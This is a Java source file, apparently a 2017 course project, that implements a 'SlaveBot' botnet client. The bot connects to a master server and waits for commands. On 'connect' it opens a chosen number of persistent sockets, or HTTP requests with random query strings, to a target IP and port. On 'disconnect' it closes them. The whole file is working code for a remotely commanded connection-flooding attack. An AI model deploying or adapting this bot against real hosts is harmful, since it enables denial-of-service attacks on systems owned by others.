/*
    Created By Ye Yuan 10/28/2017
    CMPE 206 Project Part2
*/
import java.io.*;
import java.util.*;
import java.net.*;

class RandomString {
    private static final char[] symbols;

    static{
        StringBuilder tmp = new StringBuilder();
        for(char ch = '0'; ch <= '9'; ++ch)
            tmp.append(ch);
        for(char ch = 'a'; ch <= 'z'; ++ch)
            tmp.append(ch);
        symbols = tmp.toString().toCharArray();
    }
    private final Random random = new Random();

    private final char[] buf;

    public RandomString(int length){
        if (length < 1)
            throw new IllegalArgumentException("length < 1: " + length);
        buf = new char[length];
    }
    public String nextString() {
        for (int idx = 0; idx < buf.length; ++idx)
            buf[idx] = symbols[random.nextInt(symbols.length)];
        return new String(buf);
    }

}

class SlaveBot {

    public static void main(String[] args) {

        if (args.length != 4) {
            System.out.println("Usage: java SlaveBot -h IPAddress|Hostname -p port#");
            System.exit(-1);
        }

        String mAddress = null;
        int mPort = 0;

        for (int i = 0; i < 4; ++i) {
            if (args[i].equals("-h")) {
                mAddress = args[++i];
            } else if (args[i].equals("-p")) {
                mPort = Integer.parseInt(args[++i]);
            } else {
                System.out.println("Usage: java SlaveBot -h IPAddress|Hostname -p port#");

                System.exit(-1);
            }
        }

        SlaveBot sBot = new SlaveBot(mAddress, mPort);

        try {
            sBot.run();
        } catch (Exception ex) {
            System.exit(-1);
        }
    }

    private Socket sock;

    private LinkedList<tInfo> tList;

    private BufferedReader br;

    public SlaveBot(String mAddress, int mPort) {

        while (true) {
            try {
                this.sock = new Socket(mAddress, mPort);
                this.br = new BufferedReader(new InputStreamReader(sock.getInputStream()));
                break;
            } catch (Exception ex) {
                System.exit(0);
            }
        }
        this.tList = new LinkedList<>();
    }

    public void connect(String[] cmd) {
        if (cmd.length < 4) {
            //System.out.println("check1");
            return;
        }

        String tIP = cmd[1];
        String tPort = cmd[2];
        int numOfConn = 1;
        boolean keepAlive = false;
        String url = "";


        try {
            numOfConn = Integer.parseInt(cmd[3]);
        } catch (NumberFormatException ex) {
            numOfConn = 1;
        }
        for (int i = 0; i < numOfConn; ++i) {

            String query = new RandomString((new Random()).nextInt(10)+1).nextString();
            if(cmd.length == 5) {
                if(cmd[4].compareToIgnoreCase("keepAlive") == 0) {
                    keepAlive = true;
                } else{
                    url = "http://" + cmd[1] + "/#q=" + query;
                }
            }

            if (keepAlive) {
                try {
                    tList.add(new tInfo(tIP, tPort));
                    tList.getLast().gettSock().setKeepAlive(true);
                } catch (Exception e){
                    System.out.println("can't create Target");
                }
            }

            if(url !="") {
                try {
                    System.out.println(url);
                    URL myUrl = new URL(url);
                    URLConnection myUrlConn = myUrl.openConnection();
                    myUrlConn.connect();

                } catch (MalformedURLException e) {
                    System.out.println("new URL() failed");
                } catch (IOException e) {
                    System.out.println("openConnection() failed");
                }




            }

        }
    }

    public void disconnect(String[] cmd) {
        int len = cmd.length;
        if (len < 2 || len > 3)
            return;

        int size = tList.size();

        for (int i = 0; i < size; ++i) {
            if (len == 3) {
                if (tList.get(i).gettIP().equalsIgnoreCase(cmd[1]) && tList.get(i).gettPort().equalsIgnoreCase(cmd[2])) {
                    try {
                        tList.get(i).gettSock().shutdownInput();
                        tList.get(i).gettSock().shutdownOutput();
                        tList.get(i).gettSock().close();
                    } catch (IOException ex) {

                    }
                    tList.remove(i);
                    --size;
                    --i;
                }
            } else {
                if (tList.get(i).gettIP().equalsIgnoreCase(cmd[1])) {
                    try {
                        tList.get(i).gettSock().shutdownInput();
                        tList.get(i).gettSock().shutdownOutput();
                        tList.get(i).gettSock().close();
                    } catch (IOException ex) {

                    }
                    tList.remove(i);
                    --size;
                    --i;
                }

            }
        }
    }

    public void parseCmd(String input) {
        if (input == null || input.isEmpty())
            return;

        String cmd[] = input.split("[ ]+");
        cmd[0] = cmd[0].replaceAll("[^A-Za-z0-9]", "");
        System.out.println(input);
        switch (cmd[0]) {
            case "connect":
                connect(cmd);
                break;
            case "disconnect":
                disconnect(cmd);
                break;
            default:

        }
    }

    public void run() {
        while (true) {
            try {
                String input = br.readLine();
                parseCmd(input);
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }
}

class tInfo {
    private String tIP;
    private String tPort;
    private Socket tSock;

    public tInfo(String tIP, String tPort) {
        this.tIP = tIP.trim();
        this.tPort = tPort;
        int port = Integer.parseInt(tPort);

        try {
            this.tSock = new Socket(this.tIP, port);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }


    public String gettIP() {
        return tIP;
    }

    public String gettPort() {
        return tPort;
    }

    public Socket gettSock(){
        return tSock;
    }

    public void settIP(String tIP){
        this.tIP = tIP;
    }

    public void settPort(String tPort){
        this.tPort = tPort;
    }

    public void settSock(Socket tSock){
        this.tSock = tSock;
    }

    public  void close() throws IOException {
        tSock.close();
    }

}